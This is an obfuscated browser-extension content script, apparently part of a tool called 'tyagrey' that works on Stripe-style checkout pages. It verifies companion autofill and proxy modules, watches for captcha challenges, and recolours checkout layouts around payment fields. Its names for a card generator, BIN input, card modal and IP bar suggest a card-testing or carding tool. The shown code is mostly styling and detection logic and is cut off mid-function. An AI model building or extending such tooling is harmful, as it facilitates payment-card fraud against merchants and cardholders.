(function () {
  'use strict';

  var _0x52f3a3 = window.tyagreyKeys || {};
  let _0x3ae550 = false;
  let _0x346f97 = "user";
  const _0x4d3b89 = {
    "storage.js": () => window.__tyagrey_STORAGE_LOADED === true && typeof window.tyagreyStorage !== "undefined",
    "autofill.js": () => window.__tyagrey_AUTOFILL_LOADED === true && typeof window.tyagreyAutofill !== "undefined",
    "proxyhandler.js": () => window.__tyagrey_PROXY_LOADED === true && typeof window.tyagreyProxy !== "undefined"
  };
  function _0x246b31() {
    const _0x1a9314 = [];
    const _0x18afec = [];
    for (const [_0x2dd29a, _0x25538d] of Object.entries(_0x4d3b89)) {
      try {
        if (_0x25538d()) {
          _0x18afec.push(_0x2dd29a);
        } else {
          _0x1a9314.push(_0x2dd29a);
        }
      } catch (_0x39c22c) {
        _0x1a9314.push(_0x2dd29a);
      }
    }
    return {
      missingModules: _0x1a9314,
      loadedModules: _0x18afec
    };
  }
  function _0x2c22bc(_0x457ee5) {
    const _0x558b26 = document.getElementById("tyagrey-file-error-overlay");
    if (_0x558b26) {
      _0x558b26.remove();
    }
    const _0x513069 = document.createElement("div");
    _0x513069.id = "tyagrey-file-error-overlay";
    _0x513069.className = "tyagrey-error-overlay";
    const _0x4b0518 = document.createElement("div");
    _0x4b0518.className = "tyagrey-error-content";
    const _0x28aa87 = document.createElement("div");
    _0x28aa87.className = "tyagrey-error-header";
    _0x28aa87.textContent = "⚠️ tyagrey - File Error";
    const _0x51a788 = document.createElement("div");
    _0x51a788.className = "tyagrey-error-body";
    const _0x5f1196 = document.createElement("p");
    _0x5f1196.className = "tyagrey-error-msg";
    _0x5f1196.textContent = "Extension files are missing or corrupted. Please reinstall the extension.";
    const _0x5a175b = document.createElement("div");
    _0x5a175b.className = "tyagrey-error-missing";
    const _0x5a7ffc = document.createElement("div");
    _0x5a7ffc.className = "tyagrey-error-title";
    _0x5a7ffc.textContent = "Missing Files:";
    _0x5a175b.appendChild(_0x5a7ffc);
    _0x457ee5.forEach(_0x439b27 => {
      const _0x5bc0a6 = document.createElement("div");
      _0x5bc0a6.className = "tyagrey-error-item";
      _0x5bc0a6.innerHTML = "<span class=\"tyagrey-error-x\">✗</span> " + _0x439b27;
      _0x5a175b.appendChild(_0x5bc0a6);
    });
    const _0x4e6535 = document.createElement("div");
    _0x4e6535.className = "tyagrey-error-fix";
    const _0x5adcc7 = document.createElement("div");
    _0x5adcc7.className = "tyagrey-error-title tyagrey-error-title-green";
    _0x5adcc7.textContent = "How to fix:";
    _0x4e6535.appendChild(_0x5adcc7);
    const _0x435acb = document.createElement("ol");
    _0x435acb.className = "tyagrey-error-list";
    ["Remove the current extension", "Download the latest tyagrey package", "Load the extension again in Chrome"].forEach(_0x1d9328 => {
      const _0x489591 = document.createElement("li");
      _0x489591.textContent = _0x1d9328;
      _0x435acb.appendChild(_0x489591);
    });
    _0x4e6535.appendChild(_0x435acb);
    _0x51a788.appendChild(_0x5f1196);
    _0x51a788.appendChild(_0x5a175b);
    _0x51a788.appendChild(_0x4e6535);
    _0x4b0518.appendChild(_0x28aa87);
    _0x4b0518.appendChild(_0x51a788);
    _0x513069.appendChild(_0x4b0518);
    document.body.appendChild(_0x513069);
  }
  const {
    missingModules: _0x4cd669,
    loadedModules: _0x4cb199
  } = _0x246b31();
  if (_0x4cd669.length > 0) {
    if (document.body) {
      _0x2c22bc(_0x4cd669);
    } else {
      document.addEventListener("DOMContentLoaded", () => _0x2c22bc(_0x4cd669));
    }
    window.__tyagreyBlocked = true;
    return;
  }
  window.__tyagreyVerified = true;
})();
if (window.__tyagreyBlocked) {} else if (window.__tyagreyLoaded) {} else {
  window.__tyagreyLoaded = true;
  var K = window.tyagreyKeys || {};
  let isDashboardActive = false;
  let isCaptchaVisible = false;
  let isRestoringAfterCaptcha = false;
  let wasAutoHiddenByCaptcha = false;
  let dashboardStateBeforeCaptcha = null;
  const excludedClasses = ["card-generator-overlay", "tyagrey-page-watermark", "success-toast", "success-toast-content", "success-toast-text", "success-toast-title", "success-toast-details", "success-ripple-container", "success-ripple-ring", "success-check", "warning-toast", "card-toast", "cc-modal", "snowfall-container", "celebration-container", "color-ball-container", "bin-input-row", "panel-header", "panel-body", "panel-title", "update-screen", "color-ball", "snowflake", "sparkle", "section", "section-divider", "action-btn", "primary-btn", "collapsible-section", "collapsible-header", "collapsible-content", "mode-toggle", "mode-option", "header-controls", "panel-header-content", "minimize-btn", "music-toggle", "tyagrey-bottom-ip-bar", "ip-bar-row", "ip-bar-label", "ip-bar-value", "ip-bar-divider", "ipbar-user-section", "ipbar-pfp-wrap", "ipbar-pfp", "ipbar-pfp-fallback", "ipbar-user-meta", "ipbar-username", "ipbar-stats", "ipbar-ip-section", "ipbar-status-dot", "ipbar-ip-label", "ipbar-ip-value", "ipbar-divider", "tya-overlay", "tya-pill", "tya-full", "tya-header", "tya-brand", "tya-brand-logo", "tya-brand-name", "tya-brand-tag", "tya-header-btns", "tya-header-btn", "tya-body", "tya-status-row", "tya-status-icon", "tya-status-text", "tya-stats", "tya-stat", "tya-stat-label", "tya-stat-value", "tya-stat-div", "tya-details", "tya-detail-row", "tya-detail-val", "tya-controls", "tya-ctrl", "tya-pill-logo", "tya-status-dot", "tya-pill-text", "tya-pill-btns", "tya-pill-btn"];
  const excludedContainerSelectors = [".card-generator-overlay", ".tya-overlay", ".tyagrey-page-watermark", ".success-toast", ".success-toast-content", ".success-toast-text", ".warning-toast", ".card-toast", ".cc-modal", ".snowfall-container", ".celebration-container", ".color-ball-container", ".section", ".section-divider", ".collapsible-section", ".tyagrey-bottom-ip-bar", "[class*=\"hcaptcha\"]", "[class*=\"h-captcha\"]", "[class*=\"captcha\"]", "[class*=\"Captcha\"]", "[class*=\"challenge\"]", "[class*=\"Challenge\"]", "[class*=\"modal\"]", "[class*=\"Modal\"]", "[class*=\"overlay\"]", "[class*=\"Overlay\"]", "[role=\"dialog\"]", "[role=\"alertdialog\"]", "[class*=\"PaymentMethod\"]", "[class*=\"payment-method\"]", "[class*=\"paymentMethod\"]", "[class*=\"PaymentOptions\"]", "[class*=\"payment-options\"]", "[class*=\"WalletOptions\"]", "[class*=\"wallet-options\"]", "[role=\"radiogroup\"]", "[role=\"tablist\"]"];
  function isExcludedElement(_0x37f96f) {
    if (!_0x37f96f || !_0x37f96f.classList) {
      return false;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".card-generator-overlay")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".success-toast")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".warning-toast")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".card-toast")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".tyagrey-bottom-ip-bar")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".bin-recommend-popup")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".bin-notification")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest("#tyagrey-bin-recommend")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest("#tyagrey-bin-notification")) {
      return true;
    }
    if (_0x37f96f.closest && _0x37f96f.closest(".cc-modal")) {
      return true;
    }
    if (_0x37f96f.closest && (_0x37f96f.closest("[data-hcaptcha]") || _0x37f96f.closest("[class*=\"hcaptcha\"]") || _0x37f96f.closest("[class*=\"h-captcha\"]") || _0x37f96f.closest("[id*=\"hcaptcha\"]") || _0x37f96f.closest("[id*=\"h-captcha\"]") || _0x37f96f.closest("iframe[src*=\"hcaptcha\"]") || _0x37f96f.closest("[class*=\"captcha\"]") || _0x37f96f.closest("[class*=\"Captcha\"]") || _0x37f96f.closest("[class*=\"challenge\"]") || _0x37f96f.closest("[class*=\"Challenge\"]"))) {
      return true;
    }
    for (const _0x2ea967 of excludedClasses) {
      if (_0x37f96f.classList.contains(_0x2ea967)) {
        return true;
      }
    }
    if (_0x37f96f.id && _0x37f96f.id.includes("tyagrey")) {
      return true;
    }
    if (_0x37f96f.id && (_0x37f96f.id.includes("hcaptcha") || _0x37f96f.id.includes("captcha"))) {
      return true;
    }
    if (_0x37f96f.closest) {
      for (const _0x282856 of excludedContainerSelectors) {
        if (_0x37f96f.closest(_0x282856)) {
          return true;
        }
      }
    }
    return false;
  }
  function addSmoothTransition(_0x542380) {
    try {
      const _0x3562ea = _0x542380.style.transition || "";
      if (!_0x3562ea.includes("background")) {
        _0x542380.style.transition = _0x3562ea ? _0x3562ea + ", background-color 0.3s ease" : "background-color 0.3s ease";
      }
    } catch (_0x2300a9) {}
  }
  function removeSmoothTransition(_0x40ee65) {
    try {
      setTimeout(() => {
        const _0x1bc599 = _0x40ee65.style.transition || "";
        _0x40ee65.style.transition = _0x1bc599.replace(/,?\s*background-color\s*[\d.]*s?\s*ease/g, "").trim();
      }, 350);
    } catch (_0x18a6d1) {}
  }
  function checkCaptchaVisible() {
    try {
      const _0x2499c8 = document.querySelectorAll("iframe[src*=\"hcaptcha\"], iframe[src*=\"captcha\"], iframe[src*=\"challenge\"], iframe[data-hcaptcha], iframe[title*=\"hCaptcha\"], iframe[title*=\"captcha\"], iframe[title*=\"challenge\"], iframe[title*=\"verification\"], iframe[src*=\"recaptcha\"], iframe[src*=\"turnstile\"], iframe[src*=\"arkoselabs\"]");
      for (const _0xaf810a of _0x2499c8) {
        try {
          const _0x10d6df = _0xaf810a.getBoundingClientRect();
          const _0x866a4c = window.getComputedStyle(_0xaf810a);
          if (_0x10d6df.width > 0 && _0x10d6df.height > 0 && _0x866a4c.display !== "none" && _0x866a4c.visibility !== "hidden" && _0x866a4c.opacity !== "0") {
            return true;
          }
        } catch (_0x530837) {
          continue;
        }
      }
      const _0x509038 = document.querySelectorAll("[class*=\"hcaptcha\"], [class*=\"h-captcha\"], [id*=\"hcaptcha\"], [id*=\"h-captcha\"], [data-hcaptcha], [class*=\"captcha-container\"], [class*=\"captcha-overlay\"], [class*=\"challenge-container\"], [class*=\"ChallengeContainer\"], [class*=\"recaptcha\"], [class*=\"turnstile\"], [class*=\"cf-turnstile\"], [class*=\"captcha-modal\"], [class*=\"CaptchaModal\"], [class*=\"captcha_modal\"], [class*=\"verification-modal\"], [class*=\"VerificationModal\"]");
      for (const _0x356730 of _0x509038) {
        try {
          const _0x189f73 = _0x356730.getBoundingClientRect();
          const _0x150caf = window.getComputedStyle(_0x356730);
          if (_0x189f73.width > 50 && _0x189f73.height > 50 && _0x150caf.display !== "none" && _0x150caf.visibility !== "hidden" && _0x150caf.opacity !== "0") {
            return true;
          }
        } catch (_0x208803) {
          continue;
        }
      }
      const _0x15d4bb = document.querySelectorAll("[class*=\"challenge-overlay\"], [class*=\"Challenge-overlay\"], [class*=\"security-challenge\"], [class*=\"SecurityChallenge\"]");
      for (const _0x37e42d of _0x15d4bb) {
        try {
          const _0x18c246 = _0x37e42d.getBoundingClientRect();
          const _0x2fede6 = window.getComputedStyle(_0x37e42d);
          if (_0x18c246.width > window.innerWidth * 0.5 && _0x18c246.height > window.innerHeight * 0.3 && _0x2fede6.display !== "none" && _0x2fede6.visibility !== "hidden" && _0x2fede6.opacity !== "0") {
            return true;
          }
        } catch (_0x1f75bf) {
          continue;
        }
      }
      return false;
    } catch (_0x475edf) {
      return false;
    }
  }
  const preserveOriginalSelectors = ["[class*=\"BrandIcon\"]", "[class*=\"CardBrand\"]", "[class*=\"brand-icon\"]", ".SubmitButton", "[class*=\"SubmitButton\"]", "button[type=\"submit\"]", ".Button--primary", "[data-testid=\"hosted-payment-submit-button\"]", "[class*=\"cvc\"]", "[class*=\"Cvc\"]", "[class*=\"cvv\"]", "[class*=\"SecurityCode\"]", "[class*=\"Link\"]", "[class*=\"link-button\"]", "[class*=\"LinkButton\"]", "[class*=\"PaymentMethod\"]", "[class*=\"payment-method\"]", "[class*=\"paymentMethod\"]", "[class*=\"Tab\"]", "[class*=\"tab\"]", "button[role=\"tab\"]", "[class*=\"Radio\"]", "[class*=\"radio\"]", "input[type=\"radio\"]", "[class*=\"Wallet\"]", "[class*=\"wallet\"]", "[class*=\"Icon\"]", "[class*=\"icon\"]", "[class*=\"Logo\"]", "[class*=\"logo\"]", "svg", "[role=\"img\"]", "input", "select", ".Input", "[class*=\"Input\"]", "footer", ".Footer", "[class*=\"Footer\"]", "[class*=\"footer\"]", "iframe", "[class*=\"FormFieldGroup\"]", "[class*=\"form-field\"]", "[class*=\"FormField\"]", "[class*=\"CheckoutForm\"]", "[class*=\"checkout-form\"]", "[class*=\"PaymentForm\"]", "[class*=\"ContactInformation\"]", "[class*=\"contact-information\"]", "[class*=\"BillingAddress\"]", "[class*=\"billing-address\"]", "[class*=\"ShippingAddress\"]", "[class*=\"shipping-address\"]", "[class*=\"CardElement\"]", "[class*=\"card-element\"]", "[class*=\"ElementsApp\"]", "[class*=\"elements-app\"]", "[class*=\"CheckoutPaymentForm\"]", "[class*=\"PaymentMethodSelector\"]", "[class*=\"AccordionItem\"]", "[class*=\"accordion\"]", "[class*=\"Fieldset\"]", "[class*=\"fieldset\"]", "[class*=\"FormRow\"]", "[class*=\"form-row\"]", "[class*=\"TextField\"]", "[class*=\"text-field\"]", "[class*=\"SelectField\"]", "[class*=\"select-field\"]", "[class*=\"Checkbox\"]", "[class*=\"checkbox\"]", "label", "[class*=\"Label\"]", "[class*=\"TermsText\"]", "[class*=\"terms\"]", "[class*=\"ReadOnlyFormField\"]", "[class*=\"read-only\"]", "[class*=\"SavedPaymentMethod\"]", "[class*=\"saved-payment\"]"];
  function isDesktop() {
    return window.innerWidth > 768;
  }
  function getDeviceType() {
    const _0x25cd18 = navigator.userAgent || navigator.vendor || window.opera;
    const _0x36c388 = "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0;
    const _0x36da75 = window.matchMedia && window.matchMedia("(pointer: coarse)").matches;
    const _0x48fab3 = window.matchMedia && window.matchMedia("(hover: hover)").matches;
    const _0x5c8c8c = /iPad|iPhone|iPod/.test(_0x25cd18) && !window.MSStream;
    const _0x310ecf = /android/i.test(_0x25cd18);
    const _0x4179f6 = /Mobi|Mobile|webOS|BlackBerry|Opera Mini|IEMobile/i.test(_0x25cd18);
    const _0x1beb4a = window.screen.width;
    const _0x440984 = window.screen.height;
    const _0x3383a7 = window.devicePixelRatio || 1;
    const _0x4876de = Math.min(_0x1beb4a, _0x440984) <= 768;
    const _0x557aba = screen.orientation && screen.orientation.type;
    if (_0x5c8c8c) {
      return "ios";
    }
    if (_0x36c388 && _0x36da75 && !_0x48fab3) {
      if (_0x310ecf) {
        if (/mobile/i.test(_0x25cd18)) {
          return "android_phone";
        } else {
          return "android_tablet";
        }
      }
      return "mobile";
    }
    if (_0x36c388 && _0x4876de && _0x3383a7 >= 2) {
      if (_0x310ecf) {
        return "android_phone";
      }
      return "mobile";
    }
    if (_0x36c388 && _0x36da75) {
      return "mobile";
    }
    if (_0x310ecf) {
      if (/mobile/i.test(_0x25cd18)) {
        return "android_phone";
      } else {
        return "android_tablet";
      }
    }
    if (_0x4179f6) {
      return "mobile";
    }
    if (_0x36c388 && _0x4876de) {
      return "mobile";
    }
    return "desktop";
  }
  function isMobileDevice() {
    const _0xc5ef72 = getDeviceType();
    return ["ios", "android_phone", "android_tablet", "mobile"].includes(_0xc5ef72);
  }
  function isIOSDevice() {
    const _0x4593fb = navigator.userAgent || "";
    return /iPad|iPhone|iPod/.test(_0x4593fb) && !window.MSStream;
  }
  function isDesktopDevice() {
    return getDeviceType() === "desktop";
  }
  function isTouchDevice() {
    return "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0;
  }
  function shouldApplyBackgroundColor() {
    return isMobileDevice() || isTouchDevice() && window.matchMedia("(pointer: coarse)").matches;
  }
  const desktopPreserveSelectors = ["[class*=\"RightPanel\"]", "[class*=\"right-panel\"]", "[class*=\"rightPanel\"]", "[class*=\"FormContainer\"]", "[class*=\"form-container\"]", "[class*=\"PaymentElement\"]", "[class*=\"payment-element\"]", "[class*=\"CheckoutRightColumn\"]", "[class*=\"checkout-right\"]", "[class*=\"OrderForm\"]", "[class*=\"order-form\"]", "[class*=\"CheckoutContent\"]", "[class*=\"checkout-content\"]", "[class*=\"MainContent\"]", "[class*=\"main-content\"]", "[class*=\"FormSection\"]", "[class*=\"form-section\"]", "[class*=\"CheckoutMain\"]", "[class*=\"checkout-main\"]", "[class*=\"PaymentSection\"]", "[class*=\"payment-section\"]", "[class*=\"ContactSection\"]", "[class*=\"contact-section\"]", "[class*=\"App-Payment\"]", "[class*=\"app-payment\"]", "[class*=\"StripeElement\"]", "[class*=\"stripe-element\"]"];
  function shouldPreserveElement(_0x4fed5b) {
    if (!_0x4fed5b) {
      return false;
    }
    for (const _0xc28f1a of preserveOriginalSelectors) {
      try {
        if (_0x4fed5b.matches && _0x4fed5b.matches(_0xc28f1a)) {
          return true;
        }
        if (_0x4fed5b.closest && _0x4fed5b.closest(_0xc28f1a)) {
          return true;
        }
      } catch (_0x35e85a) {}
    }
    if (isDesktop()) {
      for (const _0x392b1f of desktopPreserveSelectors) {
        try {
          if (_0x4fed5b.matches && _0x4fed5b.matches(_0x392b1f)) {
            return true;
          }
          if (_0x4fed5b.closest && _0x4fed5b.closest(_0x392b1f)) {
            return true;
          }
        } catch (_0x5ee137) {}
      }
    }
    return false;
  }
  const RANDOM_BG_COLORS = ["#44ACFF", "#44ACFF", "#44ACFF", "#44ACFF", "#44ACFF", "#0e7490", "#155e75", "#164e63", "#047857", "#065f46"];
  const DEFAULT_BG_COLOR = "#44ACFF";
  let pageBackgroundColor = DEFAULT_BG_COLOR;
  let bgColorEnabled = false;
  let hasCustomColor = false;
  let sessionRandomColor = null;
  function getRandomBgColor() {
    const _0x3e228f = Math.floor(Math.random() * RANDOM_BG_COLORS.length);
    return RANDOM_BG_COLORS[_0x3e228f];
  }
  function loadBgColorSetting() {
    return new Promise(_0x3133db => {
      const _0x54b2e5 = localStorage.getItem(K.BG_ENABLED);
      const _0x4e1f51 = localStorage.getItem(K.PAGE_BG_COLOR);
      const _0x4a8634 = localStorage.getItem(K.PAGE_HAS_CUSTOM);
      bgColorEnabled = _0x54b2e5 === "true";
      hasCustomColor = _0x4a8634 === "true";
      if (hasCustomColor && _0x4e1f51) {
        pageBackgroundColor = _0x4e1f51;
      } else if (bgColorEnabled) {
        sessionRandomColor = getRandomBgColor();
        pageBackgroundColor = sessionRandomColor;
      }
      _0x3133db();
    });
  }
  function saveBgColorSetting(_0x291646, _0x1fbe9c, _0xfe6d00 = false) {
    bgColorEnabled = _0x291646;
    hasCustomColor = _0xfe6d00;
    localStorage.setItem(K.BG_ENABLED, _0x291646 ? "true" : "false");
    localStorage.setItem(K.PAGE_HAS_CUSTOM, _0xfe6d00 ? "true" : "false");
    if (_0xfe6d00) {
      pageBackgroundColor = _0x1fbe9c;
      localStorage.setItem(K.PAGE_BG_COLOR, _0x1fbe9c);
    }
    var _0x212845 = {
      [K.BG_ENABLED]: _0x291646,
      [K.PAGE_BG_COLOR]: _0xfe6d00 ? _0x1fbe9c : "",
      [K.PAGE_HAS_CUSTOM]: _0xfe6d00
    };
    window.postMessage({
      type: "tyagrey_STORAGE_REQUEST",
      requestId: "bg_" + Date.now(),
      action: "SET",
      data: _0x212845
    }, "*");
  }
  loadBgColorSetting().then(() => {
    if (bgColorEnabled && typeof applyCustomStyles === "function") {
      applyCustomStyles();
    }
  });
  function isInPaymentFormArea(_0x2adb41) {
    if (!_0x2adb41) {
      return false;
    }
    const _0x5eb82b = ["[class*=\"RightPanelContent\"]", "[class*=\"rightPanelContent\"]", "[class*=\"App-Payment\"]", "[class*=\"PaymentFormContainer\"]", "[class*=\"CheckoutPaymentForm\"]", "[class*=\"PaymentMethodForm\"]", "[class*=\"FormFieldGroup\"]", "[class*=\"ContactInformation\"]", "[class*=\"BillingAddressForm\"]", "[class*=\"PaymentElement\"]", "[class*=\"ElementsApp\"]", "[class*=\"StripeElement\"]", "[class*=\"CheckoutForm\"]", "[class*=\"PaymentRequestButton\"]", "[class*=\"AccordionItemContent\"]", "[class*=\"FormRow\"]", "[data-testid*=\"payment\"]", "[data-testid*=\"checkout\"]", "[class*=\"Column--right\"]", "[class*=\"column-right\"]", "[class*=\"RightColumn\"]", "[class*=\"right-column\"]"];
    for (const _0x33a65a of _0x5eb82b) {
      try {
        if (_0x2adb41.closest && _0x2adb41.closest(_0x33a65a)) {
          return true;
        }
      } catch (_0x1598e4) {}
    }
    if (isDesktop()) {
      try {
        const _0x3dc205 = _0x2adb41.getBoundingClientRect();
        const _0x50a49d = window.innerWidth / 2;
        if (_0x3dc205.left > _0x50a49d - 100) {
          const _0x1bbb53 = window.getComputedStyle(_0x2adb41);
          const _0x51dc17 = _0x1bbb53.backgroundColor;
          if (_0x51dc17 && (_0x51dc17.includes("255, 255, 255") || _0x51dc17.includes("250, 250, 250") || _0x51dc17.includes("248, 248, 248") || _0x51dc17.includes("245, 245, 245"))) {
            return true;
          }
        }
      } catch (_0x5bf951) {}
    }
    return false;
  }
  let _bgStyleTag = null;
  let _lastAppliedBgColor = null;
  let _bgProcessed = new WeakSet();
  let _bgRafId = null;
  function _ensureBgStyleTag(_0x12716c) {
    if (_lastAppliedBgColor !== _0x12716c) {
      _lastAppliedBgColor = _0x12716c;
      document.documentElement.style.setProperty("background", _0x12716c, "important");
      document.documentElement.style.setProperty("background-color", _0x12716c, "important");
      document.documentElement.style.setProperty("min-height", "100vh", "important");
      if (document.body) {
        document.body.style.setProperty("background", _0x12716c, "important");
        document.body.style.setProperty("background-color", _0x12716c, "important");
        document.body.style.setProperty("min-height", "100vh", "important");
      }
    }
  }
  function _setBg(_0x36b724, _0x420cae) {
    if (_bgProcessed.has(_0x36b724)) {
      return;
    }
    _0x36b724.style.setProperty("background", _0x420cae, "important");
    _0x36b724.style.setProperty("background-color", _0x420cae, "important");
    _bgProcessed.add(_0x36b724);
  }
  function applyCustomStyles() {
    if (!bgColorEnabled) {
      return;
    }
    if (!shouldApplyBackgroundColor()) {
      return;
    }
    isCaptchaVisible = checkCaptchaVisible();
    if (isCaptchaVisible) {
      return;
    }
    let _0xd95919;
    if (hasCustomColor) {
      _0xd95919 = pageBackgroundColor;
    } else {
      if (!sessionRandomColor) {
        sessionRandomColor = getRandomBgColor();
      }
      _0xd95919 = sessionRandomColor;
    }
    if (_lastAppliedBgColor !== _0xd95919) {
      _bgProcessed = new WeakSet();
    }
    _ensureBgStyleTag(_0xd95919);
    const _0x8ac722 = isDesktop();
    const _0x2e424a = _0x8ac722 ? "[class*=\"LeftPanel\"], [class*=\"left-panel\"], [class*=\"leftPanel\"], [class*=\"Column--left\"], [class*=\"LeftColumn\"], [class*=\"ProductSummary\"], [class*=\"OrderSummary\"], [class*=\"product-summary\"], [class*=\"App\"], [class*=\"Page\"], [class*=\"Root\"], [class*=\"Shell\"], section, main, article, header, aside, nav, .Divider, [class*=\"divider\"], [class*=\"Divider\"], [class*=\"ViewDetails\"], [class*=\"details\"], [class*=\"Details\"], [class*=\"OrderDetails\"], [class*=\"order-details\"], [class*=\"Summary\"], [class*=\"summary\"], [class*=\"PaymentDetails\"], [class*=\"payment-details\"], [class*=\"LineItem\"], [class*=\"line-item\"], [class*=\"OrderSummary\"], [class*=\"order-summary\"], [class*=\"ProductDetails\"], [class*=\"product-details\"]" : "[class*=\"App\"], [class*=\"app\"], [class*=\"Page\"], [class*=\"page\"], [class*=\"Container\"], [class*=\"container\"], [class*=\"Wrapper\"], [class*=\"wrapper\"], [class*=\"Layout\"], [class*=\"layout\"], [class*=\"Content\"], [class*=\"content\"], [class*=\"Main\"], [class*=\"Body\"], [class*=\"body\"], [class*=\"Root\"], [class*=\"root\"], [class*=\"Shell\"], [class*=\"shell\"], [class*=\"Frame\"], [class*=\"frame\"], [class*=\"View\"], [class*=\"view\"], [class*=\"Panel\"], [class*=\"panel\"], [class*=\"Section\"], [class*=\"section\"], [class*=\"Block\"], [class*=\"block\"], [class*=\"Region\"], [class*=\"region\"], [class*=\"Area\"], [class*=\"area\"], [class*=\"Zone\"], [class*=\"zone\"], [class*=\"Checkout\"], [class*=\"checkout\"], [class*=\"Payment\"], [class*=\"Stripe\"], [class*=\"stripe\"], section, main, article, header, aside, nav, .Divider, [class*=\"divider\"], [class*=\"Divider\"], [class*=\"ViewDetails\"], [class*=\"details\"], [class*=\"Details\"], [class*=\"OrderDetails\"], [class*=\"order-details\"], [class*=\"Summary\"], [class*=\"summary\"], [class*=\"PaymentDetails\"], [class*=\"payment-details\"], [class*=\"LineItem\"], [class*=\"line-item\"], [class*=\"OrderSummary\"], [class*=\"order-summary\"], [class*=\"ProductDetails\"], [class*=\"product-details\"]";
    document.querySelectorAll(_0x2e424a).forEach(_0x10c835 => {
      if (!isExcludedElement(_0x10c835) && !shouldPreserveElement(_0x10c835) && (!_0x8ac722 || !isInPaymentFormArea(_0x10c835))) {
        _setBg(_0x10c835, _0xd95919);
      }
    });
    if (_0x8ac722) {
      const _0x98298c = document.getElementsByTagName("div");
      for (let _0xde3f5e = 0, _0x5ab421 = _0x98298c.length; _0xde3f5e < _0x5ab421; _0xde3f5e++) {
        const _0x65fffa = _0x98298c[_0xde3f5e];
        if (_bgProcessed.has(_0x65fffa)) {
          continue;
        }
        if (isExcludedElement(_0x65fffa) || shouldPreserveElement(_0x65fffa) || isInPaymentFormArea(_0x65fffa)) {
          continue;
        }
        const _0x1ad058 = _0x65fffa.className || "";
        if (typeof _0x1ad058 === "string" && (_0x1ad058.includes("Left") || _0x1ad058.includes("left") || _0x1ad058.includes("Product") || _0x1ad058.includes("product") || _0x1ad058.includes("Order") || _0x1ad058.includes("order") || _0x1ad058.includes("Summary") || _0x1ad058.includes("summary"))) {
          _setBg(_0x65fffa, _0xd95919);
        }
      }
    } else {
      const _0x2f922c = document.getElementsByTagName("div");
      for (let _0x2c1a18 = 0, _0x4bb2ee = _0x2f922c.length; _0x2c1a18 < _0x4bb2ee; _0x2c1a18++) {
        const _0x4188fe = _0x2f922c[_0x2c1a18];
        if (_bgProcessed.has(_0x4188fe)) {
          continue;
        }
        if (isExcludedElement(_0x4188fe) || shouldPreserveElement(_0x4188fe)) {
          continue;
        }
        _setBg(_0x4188fe, _0xd95919);
      }
    }
    if (!_0x8ac722) {
      if (_bgRafId) {
        cancelAnimationFrame(_bgRafId);
      }
      _bgRafId = requestAnimationFrame(() => {
        const _0x14b1f8 = ["span", "p", "li", "ul", "ol", "dl", "table", "tr", "td", "th", "form", "fieldset", "figure", "figcaption", "footer"];
        for (let _0x5ad3dd = 0; _0x5ad3dd < _0x14b1f8.length; _0x5ad3dd++) {
          const _0x246006 = document.getElementsByTagName(_0x14b1f8[_0x5ad3dd]);
          for (let _0x7d745a = 0, _0x5dca49 = _0x246006.length; _0x7d745a < _0x5dca49; _0x7d745a++) {
            const _0x5047e7 = _0x246006[_0x7d745a];
            if (_bgProcessed.has(_0x5047e7)) {
              continue;
            }
            if (isExcludedElement(_0x5047e7) || shouldPreserveElement(_0x5047e7)) {
              continue;
            }
            _setBg(_0x5047e7, _0xd95919);
          }
        }
        _bgRafId = null;
      });
    }
  }
  let lastCaptchaState = false;
  setInterval(() => {
    if (!isDashboardActive) {
      return;
    }
    const _0x3c4bb7 = checkCaptchaVisible();
    if (_0x3c4bb7 !== lastCaptchaState) {
      lastCaptchaState = _0x3c4bb7;
      isCaptchaVisible = _0x3c4bb7;
      if (_0x3c4bb7) {
        if (typeof autoHideDashboardForCaptcha === "function") {
          autoHideDashboardForCaptcha();
        }
      } else if (typeof restoreDashboardAfterCaptcha === "function") {
        restoreDashboardAfterCaptcha();
      }
    }
    if (!bgColorEnabled) {
      return;
    }
    if (isCaptchaVisible) {
      return;
    }
    const _0x3ac472 = pageBackgroundColor || DEFAULT_BG_COLOR;
    const _0x2e06ce = window.getComputedStyle(document.body).backgroundColor;
    const _0x14eb10 = window.getComputedStyle(document.documentElement).backgroundColor;
    if (_0x2e06ce === "rgba(0, 0, 0, 0)" || _0x2e06ce === "transparent" || _0x14eb10 === "rgba(0, 0, 0, 0)" || _0x14eb10 === "transparent" || _0x2e06ce.includes("255, 255, 255") || _0x14eb10.includes("255, 255, 255")) {
      applyCustomStyles();
    }
  }, 300);
  let styleTimeout = null;
  let isApplyingStyles = false;
  function debouncedApplyStyles() {
    if (!isDashboardActive) {
      return;
    }
    if (!bgColorEnabled) {
      return;
    }
    if (isApplyingStyles) {
      return;
    }
    if (isCaptchaVisible) {
      return;
    }
    if (styleTimeout) {
      clearTimeout(styleTimeout);
    }
    styleTimeout = setTimeout(() => {
      if (!isDashboardActive) {
        return;
      }
      if (checkCaptchaVisible()) {
        isCaptchaVisible = true;
        return;
      }
      isApplyingStyles = true;
      applyCustomStyles();
      isApplyingStyles = false;
    }, 50);
  }
  const styleObserver = new MutationObserver(_0x304c9e => {
    const _0x35613b = _0x304c9e.some(_0x3034b2 => {
      return Array.from(_0x3034b2.addedNodes).some(_0x37259f => {
        if (_0x37259f.nodeType === 1) {
          return _0x37259f.matches && (_0x37259f.matches("[class*=\"hcaptcha\"]") || _0x37259f.matches("[id*=\"hcaptcha\"]") || _0x37259f.matches("[data-hcaptcha]") || _0x37259f.matches("iframe[src*=\"hcaptcha\"]") || _0x37259f.matches("iframe[src*=\"captcha\"]") || _0x37259f.matches("[class*=\"captcha\"]") || _0x37259f.matches("[class*=\"challenge\"]") || _0x37259f.matches("[class*=\"Challenge\"]") || _0x37259f.matches("iframe[title*=\"captcha\" i]") || _0x37259f.matches("iframe[title*=\"challenge\" i]"));
        }
        return false;
      });
    });
    if (_0x35613b) {
      isCaptchaVisible = true;
